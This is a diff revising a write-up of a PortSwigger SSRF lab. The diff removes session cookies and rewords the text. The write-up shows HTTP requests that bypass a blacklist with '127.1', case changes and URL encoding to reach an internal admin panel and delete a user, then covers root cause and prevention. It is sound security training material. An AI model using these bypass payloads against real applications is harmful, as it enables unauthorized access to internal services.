@@ -1,19 +1,19 @@
 # PortSwigger Lab: SSRF with blacklist-based input filter
 
-# TAGS: SSRF, Server-Side Request Forgery, Filter Bypass, Burp Suite
+**TAGS:** SSRF, Server-Side Request Forgery, Filter Bypass, Burp Suite
 
-Category: SSRF
-Date: November 11, 2026
-Day: Wednesday
-Link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist
-Published: Ready
-Status: Done
+**Category:** SSRF  
+**Date:** November 11, 2026  
+**Day:** Wednesday  
+**Link:** https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist  
+**Published:** Ready  
+**Status:** Done
 
 ---
 
 ## Intro
 
-This is the third lab in the SSRF series. Now the application tries to protect the stock check with a blacklist. It blocks the obvious localhost addresses and even the word "admin". The lesson here is that blacklists are easy to beat, because there is always more than one way to write the same IP or the same path.
+This is the third lab in the SSRF series. Now the application tries to protect the stock check with a blacklist. It blocks the obvious localhost addresses and even the word "admin". The problem is that blacklists can be easy to bypass when there is more than one way to write the same IP address or path.
 
 This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.
 
@@ -30,7 +30,6 @@ I opened a product and captured the stock request:
 ```http
 POST /product/stock HTTP/2
 Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
-Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
@@ -42,7 +41,7 @@ My first tries were rejected. Pointing it at `http://127.0.0.1/` returned:
 External stock check blocked for security reasons
 ```
 
-So there is a filter, and I needed to find out exactly what it blocks.
+So there was a filter, and I needed to find out exactly what it blocked.
 
 ---
 
@@ -50,40 +49,44 @@ So there is a filter, and I needed to find out exactly what it blocks.
 
 #### Step 1: Bypass the IP blacklist
 
-The filter rejected `127.0.0.1`, so I tried an alternative way of writing the same address. `127.1` is interpreted by many parsers as `127.0.0.1`:
+The filter rejected `127.0.0.1`, so I tried an alternative way of writing the same address. Many URL parsers and networking libraries interpret `127.1` as `127.0.0.1`:
 
 ```http
 POST /product/stock HTTP/2
 Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
-Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://127.1/
 ```
 
-This time the request succeeded. The IP filter only checks for the exact strings it knows.
+This time the request succeeded.
+
+The result suggested that the filter was checking specific representations of internal addresses rather than validating the actual destination after normalization.
 
 #### Step 2: Bypass the path blacklist
 
-Next I tried `http://127.1/admin`, but it was blocked again. The filter also looks for the string "admin". I just changed the case:
+Next I tried `http://127.1/admin`, but it was blocked again. The filter also appeared to check for the string "admin".
+
+I changed the case:
 
 ```http
 POST /product/stock HTTP/2
 Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
-Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://127.1/Admin
 ```
 
-The response was the admin panel, showing the links to delete users:
+The response contained the admin panel, showing the links to delete users:
 
 ```text
 /admin/delete?username=wiener
 /admin/delete?username=carlos
 ```
 
-URL encoding works too. `http://127.1/adm%69n` and `http://127.1/%61dmin` both reached the same page.
+URL encoding worked too. I tested `http://127.1/adm%69n` and `http://127.1/%61dmin`, and both reached the same page.
+
+These results suggested that the filter did not consistently normalize the path before checking it.
 
 #### Step 3: Delete carlos
 
@@ -92,25 +95,38 @@ I changed the URL to the delete endpoint, keeping the same case trick:
 ```http
 POST /product/stock HTTP/2
 Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
-Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://127.1/Admin/delete?username=carlos
 ```
 
-The server deleted `carlos` and the lab was solved.
+The server reached the administrative deletion endpoint. The user `carlos` was deleted and the lab was solved.
 
 ---
 
 ## Root Cause
 
-The application protects the stock URL with a blacklist, but blacklists only catch the exact strings they are programmed to block. The filter checks for `127.0.0.1` and `localhost`, but not `127.1`, and it checks for "admin" but not "Admin" or URL-encoded forms. Because the filter is case-sensitive and does not normalize the input before checking, each blocked string has many equivalent forms that slip through.
+The application protects the stock URL with a blacklist, but the filter does not recognize all equivalent representations of the blocked destinations.
+
+It rejects `127.0.0.1` and `localhost`, but allows `127.1`, which many URL parsers interpret as the same loopback address.
+
+The filter also blocks the lowercase string "admin", but the application accepts alternative representations such as "Admin" and URL-encoded characters.
+
+Because the filter does not consistently normalize the URL before validation, different representations of the same destination can bypass its restrictions.
+
+The underlying problem is that the application relies on matching specific strings instead of validating the actual destination of the outgoing request.
 
 ---
 
 ## Impact
 
-A blacklist is an ineffective defense against SSRF. An attacker can reach internal endpoints using alternative IP notations and encoded paths. In this lab that was enough to delete a user. In a real application the same bypass leads to internal service access, data theft or further compromise.
+A blacklist that relies on specific strings is an unreliable defense against SSRF.
+
+An attacker may be able to reach internal endpoints using alternative IP representations, different character casing, or encoded paths.
+
+In this lab, the bypass allowed access to the internal admin panel and the deletion of a user.
+
+In a real application, a similar vulnerability could expose internal services, sensitive information, or administrative functionality. Depending on the accessible systems, it could also lead to further compromise.
 
 ---
 
@@ -118,27 +134,29 @@ A blacklist is an ineffective defense against SSRF. An attacker can reach intern
 
 To prevent this issue, applications should:
 
-- Use an allow-list of permitted destinations instead of a blacklist.
-- Normalize and resolve the host before validating it, so equivalent forms are treated the same.
-- Block entire IP ranges and cloud metadata endpoints at the network level.
-- Authenticate and authorize every internal endpoint, and never rely on the hostname or path being "hidden".
+- Use an allowlist of permitted destinations instead of relying on a blacklist of known dangerous addresses.
+- Parse and normalize URLs consistently before validation.
+- Resolve hostnames and validate the resulting IP addresses, including alternative representations of loopback and private addresses.
+- Restrict access to internal IP ranges and cloud metadata endpoints at the network level.
+- Validate redirects and ensure that the final destination is still permitted.
+- Authenticate and authorize every internal endpoint instead of relying on the assumption that internal services cannot be reached externally.
 
 ---
 
 ## Key Takeaways
 
-1. Blacklists fail because there are always equivalent ways to write the same target.
-2. `127.1` is a quick bypass for `127.0.0.1`.
-3. Case and URL encoding bypass string filters like "admin".
-4. Always normalize the URL before applying any check.
+1. Blacklists based on specific strings can fail when equivalent representations of a destination are accepted.
+2. `127.1` is an alternative representation of `127.0.0.1` supported by many URL parsers.
+3. Case changes and URL encoding can bypass filters that do not normalize paths consistently.
+4. Always validate the actual destination of a request, not just the original URL string.
 
 ---
 
 ## References
 
-- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
-- [PortSwigger — SSRF with blacklist-based input filter (lab)](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist)
-- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
+- PortSwigger — SSRF with blacklist-based input filter (lab): https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist
+- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 
 ---
 
